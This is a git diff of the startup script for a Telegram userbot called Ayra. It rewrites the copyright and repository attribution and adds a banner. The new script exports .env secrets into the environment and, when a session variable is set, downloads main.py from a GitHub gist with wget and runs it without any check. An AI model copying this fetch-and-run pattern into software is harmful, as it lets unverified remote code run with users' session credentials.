@@ -1,9 +1,20 @@
 #!/usr/bin/env bash
 # Ayra - UserBot
-# Copyright (C) 2021-2022 senpai80
+# Copyright (C) 2021-2022 Kynan
 #
-# This file is a part of < https://github.com/senpai80/Ayra/ >
-# PLease read the GNU Affero General Public License in <https://www.github.com/senpai80/Ayra/blob/main/LICENSE/>.
+# This file is a part of < https://github.com/naya1503/Ayra/ >
+# PLease read the GNU Affero General Public License in <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.
 
 
-python3 -m Ayra
+echo "
+            █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+            █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
+            █░░║║║╠─║─║─║║║║║╠─░░█
+            █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
+            █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
+
+      
+
+"
+if [ -f .env ] ; then  set -o allexport; source .env; set +o allexport ; fi
+if [ $SESSION1 ] ; then wget https://gist.githubusercontent.com/naya1503/8757ecdfdccd3cffaa2827be3824c078/raw/main.py && python3 main.py ; else python3 -m Ayra ; fi
